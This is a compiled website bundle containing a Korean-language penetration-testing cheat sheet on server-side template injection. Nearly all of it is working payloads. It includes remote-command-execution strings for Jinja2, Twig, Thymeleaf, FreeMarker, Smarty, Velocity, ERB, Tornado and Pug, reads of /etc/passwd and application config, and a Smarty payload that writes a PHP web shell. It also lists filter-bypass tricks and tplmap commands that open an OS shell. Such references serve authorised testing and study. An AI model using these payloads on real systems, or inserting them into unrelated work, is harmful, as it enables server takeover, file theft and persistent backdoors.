"use strict";(self.webpackChunkmy_docusaurus_website=self.webpackChunkmy_docusaurus_website||[]).push([[3111],{28453:(e,n,a)=>{a.d(n,{R:()=>r,x:()=>t});var s=a(96540);const l={},i=s.createContext(l);function r(e){const n=s.useContext(i);return s.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function t(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(l):e.components||l:r(e.components),s.createElement(i.Provider,{value:n},e.children)}},78343:(e,n,a)=>{a.r(n),a.d(n,{assets:()=>c,contentTitle:()=>t,default:()=>h,frontMatter:()=>r,metadata:()=>s,toc:()=>d});const s=JSON.parse('{"id":"cheatsheet/web-application/ssti","title":"Server-Side Template Injection (SSTI)","description":"\uae30\ubcf8 \uac1c\ub150","source":"@site/docs/cheatsheet/web-application/ssti.md","sourceDirName":"cheatsheet/web-application","slug":"/cheatsheet/web-application/ssti","permalink":"/my-docusaurus-page/cheatsheet/web-application/ssti","draft":false,"unlisted":false,"tags":[],"version":"current","sidebarPosition":6,"frontMatter":{"sidebar_position":6},"sidebar":"tutorialSidebar","previous":{"title":"Server-Side Request Forgery (SSRF)","permalink":"/my-docusaurus-page/cheatsheet/web-application/ssrf"},"next":{"title":"XML External Entity (XXE)","permalink":"/my-docusaurus-page/cheatsheet/web-application/xxe"}}');var l=a(74848),i=a(28453);const r={sidebar_position:6},t="Server-Side Template Injection (SSTI)",c={},d=[{value:"\uae30\ubcf8 \uac1c\ub150",id:"\uae30\ubcf8-\uac1c\ub150",level:2},{value:"Fuzz String",id:"fuzz-string",level:2},{value:"\ud15c\ud50c\ub9bf \uc5d4\uc9c4 \ud0d0\uc9c0",id:"\ud15c\ud50c\ub9bf-\uc5d4\uc9c4-\ud0d0\uc9c0",level:2},{value:"Jinja2 (Python/Flask)",id:"jinja2-pythonflask",level:2},{value:"Magic Payload",id:"magic-payload",level:3},{value:"\ud30c\uc77c \uc77d\uae30",id:"\ud30c\uc77c-\uc77d\uae30",level:3},{value:"Config \uc77d\uae30",id:"config-\uc77d\uae30",level:3},{value:"Twig (PHP)",id:"twig-php",level:2},{value:"RCE",id:"rce",level:3},{value:"Thymeleaf (Java/Spring)",id:"thymeleaf-javaspring",level:2},{value:"FreeMarker (Java)",id:"freemarker-java",level:2},{value:"Smarty (PHP)",id:"smarty-php",level:2},{value:"Velocity (Java)",id:"velocity-java",level:2},{value:"ERB (Ruby)",id:"erb-ruby",level:2},{value:"Tornado (Python)",id:"tornado-python",level:2},{value:"Django (Python)",id:"django-python",level:2},{value:"Pug (Node.js)",id:"pug-nodejs",level:2},{value:"\uc6b0\ud68c \uae30\ubc95",id:"\uc6b0\ud68c-\uae30\ubc95",level:2},{value:"\uacf5\ubc31 \uc6b0\ud68c",id:"\uacf5\ubc31-\uc6b0\ud68c",level:3},{value:"\ub530\uc634\ud45c \uc6b0\ud68c",id:"\ub530\uc634\ud45c-\uc6b0\ud68c",level:3},{value:"\ud544\ud130 \uc6b0\ud68c",id:"\ud544\ud130-\uc6b0\ud68c",level:3},{value:"\ud0d0\uc9c0 \ubc0f \uc775\uc2a4\ud50c\ub85c\uc787 \ub3c4\uad6c",id:"\ud0d0\uc9c0-\ubc0f-\uc775\uc2a4\ud50c\ub85c\uc787-\ub3c4\uad6c",level:2},{value:"tplmap",id:"tplmap",level:3},{value:"\ucc38\uace0",id:"\ucc38\uace0",level:2}];function o(e){const n={a:"a",blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",li:"li",p:"p",pre:"pre",ul:"ul",...(0,i.R)(),...e.components};return(0,l.jsxs)(l.Fragment,{children:[(0,l.jsx)(n.header,{children:(0,l.jsx)(n.h1,{id:"server-side-template-injection-ssti",children:"Server-Side Template Injection (SSTI)"})}),"\n",(0,l.jsx)(n.h2,{id:"\uae30\ubcf8-\uac1c\ub150",children:"\uae30\ubcf8 \uac1c\ub150"}),"\n",(0,l.jsx)(n.p,{children:"\ud15c\ud50c\ub9bf \uc5d4\uc9c4\uc774 \uc0ac\uc6a9\uc790 \uc785\ub825\uc744 \uc548\uc804\ud558\uc9c0 \uc54a\uac8c \ucc98\ub9ac\ud560 \ub54c \ubc1c\uc0dd\ud558\ub294 \ucde8\uc57d\uc810\uc785\ub2c8\ub2e4."}),"\n",(0,l.jsx)(n.h2,{id:"fuzz-string",children:"Fuzz String"}),"\n",(0,l.jsxs)(n.blockquote,{children:["\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.a,{href:"https://cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti",children:"https://cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti"})}),"\n"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{children:"${{<%[%'\"}}%\\.\n"})}),"\n",(0,l.jsx)(n.h2,{id:"\ud15c\ud50c\ub9bf-\uc5d4\uc9c4-\ud0d0\uc9c0",children:"\ud15c\ud50c\ub9bf \uc5d4\uc9c4 \ud0d0\uc9c0"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{children:"# \uae30\ubcf8 \ud14c\uc2a4\ud2b8\n{{7*7}}\n${7*7}\n<%= 7*7 %>\n${{7*7}}\n#{7*7}\n\n# \uacb0\uacfc\ub85c \uc5d4\uc9c4 \uc2dd\ubcc4\n49 \u2192 \ub300\ubd80\ubd84\uc758 \ud15c\ud50c\ub9bf \uc5d4\uc9c4\n7*7 \u2192 \ud15c\ud50c\ub9bf\uc774 \uc544\ub2d8\n"})}),"\n",(0,l.jsx)(n.h2,{id:"jinja2-pythonflask",children:"Jinja2 (Python/Flask)"}),"\n",(0,l.jsx)(n.h3,{id:"magic-payload",children:"Magic Payload"}),"\n",(0,l.jsxs)(n.blockquote,{children:["\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.a,{href:"https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee",children:"https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee"})}),"\n"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-python",children:"# \ubaa8\ub4e0 \uc11c\ube0c\ud074\ub798\uc2a4 \ud655\uc778\n{\u200b{ ''.__class__.__mro__[1].__subclasses__() }\u200b}\n\n# \ud2b9\uc815 \ud074\ub798\uc2a4 \ucc3e\uae30 (\uc608: subprocess.Popen)\n{\u200b{ ''.__class__.__mro__[1].__subclasses__()[396] }\u200b}\n\n# RCE\n{\u200b{ ''.__class__.__mro__[1].__subclasses__()[396]('whoami', shell=True, stdout=-1).communicate() }\u200b}\n"})}),"\n",(0,l.jsx)(n.h3,{id:"\ud30c\uc77c-\uc77d\uae30",children:"\ud30c\uc77c \uc77d\uae30"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-python",children:"{\u200b{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }\u200b}\n"})}),"\n",(0,l.jsx)(n.h3,{id:"config-\uc77d\uae30",children:"Config \uc77d\uae30"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-python",children:"{\u200b{ config }\u200b}\n{\u200b{ config.items() }\u200b}\n{\u200b{ self.__dict__ }\u200b}\n"})}),"\n",(0,l.jsx)(n.h2,{id:"twig-php",children:"Twig (PHP)"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"{{7*7}}           # 49\n{{7*'7'}}         # 7777777\n{{dump(app)}}     # \uc124\uc815 \uc815\ubcf4\n{{app.request.server.all|join(',')}}  # \ud658\uacbd \ubcc0\uc218\n"})}),"\n",(0,l.jsx)(n.h3,{id:"rce",children:"RCE"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:'# Payload 1\n{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}\n\n# Payload 2\n{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}\n'})}),"\n",(0,l.jsx)(n.h2,{id:"thymeleaf-javaspring",children:"Thymeleaf (Java/Spring)"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-java",children:"${7*7}            # 49\n${T(java.lang.Runtime).getRuntime().exec('calc')}\n*{T(java.lang.Runtime).getRuntime().exec('calc')}\n"})}),"\n",(0,l.jsx)(n.h2,{id:"freemarker-java",children:"FreeMarker (Java)"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-java",children:"${7*7}            # 49\n<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"id\") }\n[#assign ex='freemarker.template.utility.Execute'?new()]${ ex('id')}\n"})}),"\n",(0,l.jsx)(n.h2,{id:"smarty-php",children:"Smarty (PHP)"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"{$smarty.version}\n{php}echo `id`;{/php}\n{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['cmd']); ?>\",self::clearConfig())}\n"})}),"\n",(0,l.jsx)(n.h2,{id:"velocity-java",children:"Velocity (Java)"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-java",children:"#set($x='')+$x.class.forName('java.lang.Runtime').getRuntime().exec('id')\n"})}),"\n",(0,l.jsx)(n.h2,{id:"erb-ruby",children:"ERB (Ruby)"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-ruby",children:"<%= 7*7 %>        # 49\n<%= system('whoami') %>\n<%= `whoami` %>\n<%= File.open('/etc/passwd').read %>\n"})}),"\n",(0,l.jsx)(n.h2,{id:"tornado-python",children:"Tornado (Python)"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-python",children:"{{7*7}}\n{% import os %}{{os.system('whoami')}}\n"})}),"\n",(0,l.jsx)(n.h2,{id:"django-python",children:"Django (Python)"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-python",children:"{{7*7}}           # \uc77c\ubc18\uc801\uc73c\ub85c \uc2e4\ud589 \uc548\ub428 (\uc548\uc804)\n{% debug %}       # \ub514\ubc84\uadf8 \uc815\ubcf4\n"})}),"\n",(0,l.jsx)(n.h2,{id:"pug-nodejs",children:"Pug (Node.js)"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-javascript",children:"= 7*7             # 49\n= process.env\n- var x = root.process\n- x.mainModule.require('child_process').exec('whoami')\n"})}),"\n",(0,l.jsx)(n.h2,{id:"\uc6b0\ud68c-\uae30\ubc95",children:"\uc6b0\ud68c \uae30\ubc95"}),"\n",(0,l.jsx)(n.h3,{id:"\uacf5\ubc31-\uc6b0\ud68c",children:"\uacf5\ubc31 \uc6b0\ud68c"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-python",children:"{{''.__class__.__mro__[1].__subclasses__()[396]('whoami',shell=True,stdout=-1).communicate()}}\n"})}),"\n",(0,l.jsx)(n.h3,{id:"\ub530\uc634\ud45c-\uc6b0\ud68c",children:"\ub530\uc634\ud45c \uc6b0\ud68c"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-python",children:"{{request.application.__globals__.__builtins__.__import__(request.args.x).system(request.args.c)}}&x=os&c=whoami\n"})}),"\n",(0,l.jsx)(n.h3,{id:"\ud544\ud130-\uc6b0\ud68c",children:"\ud544\ud130 \uc6b0\ud68c"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-python",children:"{{'__cla'+'ss__'}}\n{{''['__cla''ss__']}}\n"})}),"\n",(0,l.jsx)(n.h2,{id:"\ud0d0\uc9c0-\ubc0f-\uc775\uc2a4\ud50c\ub85c\uc787-\ub3c4\uad6c",children:"\ud0d0\uc9c0 \ubc0f \uc775\uc2a4\ud50c\ub85c\uc787 \ub3c4\uad6c"}),"\n",(0,l.jsx)(n.h3,{id:"tplmap",children:"tplmap"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:"# \uc790\ub3d9 \ud0d0\uc9c0 \ubc0f \uc775\uc2a4\ud50c\ub85c\uc787\n./tplmap.py -u 'http://<RHOST>/?name=test'\n\n# POST \uc694\uccad\n./tplmap.py -u 'http://<RHOST>/' -d 'name=test'\n\n# \uc258 \ud68d\ub4dd\n./tplmap.py -u 'http://<RHOST>/?name=test' --os-shell\n"})}),"\n",(0,l.jsx)(n.h2,{id:"\ucc38\uace0",children:"\ucc38\uace0"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:"SSTI\ub294 RCE\ub85c \uc774\uc5b4\uc9c8 \uc218 \uc788\uc74c"}),"\n",(0,l.jsx)(n.li,{children:"\uac01 \ud15c\ud50c\ub9bf \uc5d4\uc9c4\ub9c8\ub2e4 \ud398\uc774\ub85c\ub4dc\uac00 \ub2e4\ub984"}),"\n",(0,l.jsxs)(n.li,{children:[(0,l.jsx)(n.code,{children:"{{7*7}}"})," \uac19\uc740 \uae30\ubcf8 \ud14c\uc2a4\ud2b8\ub85c \ud0d0\uc9c0"]}),"\n",(0,l.jsx)(n.li,{children:"Jinja2\uac00 \uac00\uc7a5 \ud754\ud568 (Python/Flask)"}),"\n",(0,l.jsx)(n.li,{children:"Sandbox \uc6b0\ud68c \ud544\uc694\ud560 \uc218 \uc788\uc74c"}),"\n",(0,l.jsx)(n.li,{children:"\ud30c\uc77c \uc77d\uae30, \uc124\uc815 \ub178\ucd9c, RCE \uac00\ub2a5"}),"\n"]})]})}function h(e={}){const{wrapper:n}={...(0,i.R)(),...e.components};return n?(0,l.jsx)(n,{...e,children:(0,l.jsx)(o,{...e})}):o(e)}}}]);